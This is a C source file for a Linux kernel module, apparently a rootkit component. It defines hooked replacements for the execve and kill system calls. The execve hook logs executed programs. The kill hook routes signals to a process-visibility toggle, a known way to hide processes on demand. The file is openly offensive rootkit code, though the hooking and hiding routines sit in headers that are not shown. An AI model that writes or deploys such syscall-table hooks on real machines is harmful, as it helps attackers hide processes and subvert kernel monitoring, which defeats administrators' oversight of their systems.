/*
 * hack_syscall_tbl_module
 * Copyright (C) 2021  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>

#include "hide_proc.h"
#include "hook_funcs.h"

sys_call_fn_t orig_execve;
sys_call_fn_t orig_kill;

asmlinkage long hack_execve(const struct pt_regs* p_regs)
{
    int exec_res;
    char __user* filename = (char*)p_regs->di;
    char kfilename[NAME_MAX] = {0};

    if (strncpy_from_user(kfilename, filename, NAME_MAX) > 0) {
        printk(KERN_INFO "executable file is '%s'\n", kfilename);
    }

    exec_res = orig_execve(p_regs);
    /*
     * #define current get_current()
     * static inline struct task_struct * get_current(void) - return context of current task.
     */
    printk(KERN_INFO "execve '%s' process\n", current->comm);
    return exec_res;
}

asmlinkage long hack_kill(const struct pt_regs* p_regs)
{
    pid_t pid = (pid_t)p_regs->di;
    int sig = (int)p_regs->si;

    ch_visibility_status(pid, sig);
    return orig_kill(p_regs);
}

